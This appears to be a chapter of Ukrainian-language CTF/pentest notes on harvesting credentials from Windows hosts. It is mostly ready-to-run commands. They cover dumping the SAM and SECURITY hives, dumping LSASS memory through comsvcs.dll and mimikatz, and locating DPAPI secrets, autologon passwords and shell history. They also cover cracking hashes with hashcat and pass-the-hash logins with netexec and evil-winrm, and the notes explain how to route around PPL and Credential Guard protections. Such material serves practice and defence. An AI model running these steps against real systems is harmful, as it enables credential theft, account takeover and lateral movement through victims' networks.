# Windows: Credentials (збір і аналіз)

**Навіщо:** знайдений пароль/хеш — головне паливо privesc і lateral/AD. Тут — де Windows тримає креди й як їх дістати на кожному рівні доступу.
**Коли:** є будь-який доступ; особливо після SYSTEM/Administrator (відкриваються SAM/LSASS).
← [README](README.md) · [privesc](03-privesc.md) · [lateral](06-lateral-postex.md) · [AD](05-active-directory.md)

> **Що з чим робити:** NT-хеш → **Pass-the-Hash** або крек `hashcat -m 1000`. Plaintext → `runas`/PtH/SSH/веб. NetNTLMv2 → лише крек `-m 5600`. Kerberos TGS → `-m 13100`. Деталі типів — [fundamentals](00-fundamentals.md#5-ntlm-аутентифікація).

---

## 1. SAM / SYSTEM / SECURITY (локальні хеші) — потрібні права SYSTEM/Administrator
**Коли:** вже SYSTEM/адмін (або є SeBackup).
```cmd
:: вивантажити кущі реєстру
reg save HKLM\SAM     C:\temp\sam.hiv
reg save HKLM\SYSTEM  C:\temp\system.hiv
reg save HKLM\SECURITY C:\temp\security.hiv
:: забрати файли на Kali (file-transfer) → дамп офлайн:
```
```bash
impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCAL
```
**Інтерпретація:** рядки `Administrator:500:aad3b435...:<NThash>:::` → локальні NT-хеші. `security.hiv` інколи містить **LSA secrets / cached domain creds** (DCC2, крек `-m 2100`) і autologon-пароль відкритим текстом.
**Що далі:** локальний Administrator-хеш часто **перевикористовується** на інших хостах → PtH-spray ([lateral](06-lateral-postex.md#pass-the-hash)).
**Обмеження:** без SYSTEM/SeBackup `reg save HKLM\SAM` дасть `Access denied`.

### Віддалено (є адмін-креди по мережі)
```bash
impacket-secretsdump '<domain>/<user>:<pass>@'$TARGET        # SAM + LSA + (на DC) NTDS
netexec smb $TARGET -u <user> -p <pass> --sam                # швидкий дамп SAM
netexec smb $TARGET -u <user> -p <pass> --lsa                # LSA secrets
```

## 2. LSASS (креди в пам'яті активних сесій) <a id="lsass"></a>
**Коли:** SYSTEM/адмін; у пам'яті — plaintext/NT-хеші/квитки залогінених юзерів (цінно в домені).
```cmd
:: варіант А: дамп штатним rundll32 (LOLBAS), потім аналіз на Kali
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full
:: PID LSASS: tasklist /svc | findstr lsass   (або  Get-Process lsass).Id
```
```bash
# на Kali:
pypykatz lsa minidump lsass.dmp            # витягти хеші/паролі/квитки
```
```cmd
:: варіант Б: mimikatz (на Kali у /usr/share/windows-resources/mimikatz) — залити й запустити від адміна
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit         :: Kerberos-ключі
```
**Інтерпретація:** у виводі — доменні юзери з NT-хешами/інколи plaintext → прямий шлях у [AD](05-active-directory.md)/[lateral](06-lateral-postex.md).
**Обмеження + що робити при невдачі (LSASS — критичний шлях, тож май план Б):**
- Розпізнати захист ДО дампу: `reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL` (=1 → **PPL**); `reg query "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\CredentialGuard" /v Enabled` (=1 → **Credential Guard**). `comsvcs` MiniDump потребує **SeDebug** (є у SYSTEM).
- Якщо дамп падає (`0x5`/порожній .dmp) через PPL/CG — **не застрягай на LSASS**, бери креди інакше:
  - локальні хеші з реєстру: `reg save HKLM\SAM`/`SYSTEM` → `secretsdump … LOCAL` (п.1) — PPL не заважає;
  - cached domain creds: `secretsdump … -security` → DCC2 (`-m 2100`);
  - диск/конфіги/`cmdkey`/autologon (п.4) — часто швидше за LSASS;
  - у домені — **AS-REP/Kerberoast** ([AD](05-active-directory.md)) не потребують LSASS взагалі.
- У CTF PPL/CG **зазвичай вимкнені** — але якщо ввімкнені, обхід PPL (драйвер/`mimikatz !+ `) складний і ризикований; простіше взяти креди альтернативним джерелом вище.

## 3. DPAPI (збережені секрети браузерів/cred/vault)
**Коли:** знайдено зашифровані DPAPI-блоби (Chrome/Edge логіни, Windows Vault, RDP `.rdg`).
```cmd
:: місця
dir /a "%APPDATA%\Microsoft\Credentials" "%LOCALAPPDATA%\Microsoft\Credentials"
dir /a "%APPDATA%\Microsoft\Protect"      :: masterkey
```
Розшифрування — через mimikatz `dpapi::` або pypykatz/impacket-dpapi (потрібен masterkey, який відв'язується паролем юзера або SYSTEM-ключем).
**Обмеження:** DPAPI складніший і рідший у CTF — чіпати, лише коли простіші джерела порожні.

## 4. Швидкі джерела (без адмін-прав) — перевіряти ЗАВЖДИ першими
```cmd
:: Credential Manager / збережені RDP-WinRM креди
cmdkey /list                              :: є записи → runas /savecred можливий
:: autologon у реєстрі (plaintext!)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultPassword"
:: PowerShell history (часто пароль у команді)
type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
:: unattend / sysprep (інсталяційні паролі, base64)
dir /s /b C:\unattend.xml C:\Windows\Panther\Unattend.xml C:\Windows\System32\sysprep\*.xml 2>nul
```
```powershell
# пошук кредів у конфігах по диску
Get-ChildItem C:\ -Recurse -Include *.config,*.xml,*.ini,*.txt,*.ps1 -EA 0 |
  Select-String -Pattern 'password|passwd|pwd=|connectionString|cpassword|secret' -EA 0 |
  Select Path,Line -Unique
# IIS web.config connection strings
gci C:\inetpub -Recurse -Filter web.config -EA 0 | Select-String 'connectionString'
```
**Інтерпретація:** `cmdkey /list` з записом → `runas /savecred /user:<user> "cmd"` виконає від того юзера **без пароля**. autologon `DefaultPassword` → готовий plaintext.
**Приклад-місця:** `web.config`, `*.config`, `unattend.xml`, `sysprep.xml`, `*.kdbx` (KeePass → `keepass2john`), `*.ps1`, PSReadLine history, нотатки на Desktop.

## 5. NTLM-хеші — що робити
| Вигляд | Тип | Дія |
|---|---|---|
| `...::...:aad3b435...:31d6cfe0...` | LM:NT (SAM/secretsdump) | **PtH** або `hashcat -m 1000` (NT) |
| `user::DOMAIN:1122334455667788:...` | NetNTLMv2 (Responder) | тільки крек `hashcat -m 5600` |
| `$krb5tgs$23$...` | Kerberos TGS (Kerberoast) | `hashcat -m 13100` |
| `$krb5asrep$23$...` | AS-REP | `hashcat -m 18200` |
| `$DCC2$...` / `$MSCACHE...` | cached domain (LSA) | `hashcat -m 2100` |
```bash
hashcat -m 1000 nt.txt /usr/share/wordlists/rockyou.txt    # NT-хеш → пароль
# PtH без крека (NT-хеш як пароль):
netexec smb $TARGET -u Administrator -H <NThash>
evil-winrm -i $TARGET -u Administrator -H <NThash>
```

## Часті помилки
- Не перевірити `cmdkey`/autologon/PSReadLine **до** важкого дампу LSASS.
- Крекати NetNTLMv2 як NT-хеш (різні `-m`) — втрата часу.
- Не спробувати знайдений локальний Administrator-хеш на **інших** хостах (PtH-reuse).
- Забути, що `security.hiv` часто містить autologon-пароль і cached creds.

## Джерела
- HackTricks — Windows credentials (SAM/LSA/LSASS/DPAPI): https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html
- HackTricks — Mimikatz / credential dumping: https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/index.html
- impacket (secretsdump): https://github.com/fortra/impacket
- pypykatz: https://github.com/skelsec/pypykatz · hashcat modes: https://hashcat.net/wiki/doku.php?id=example_hashes
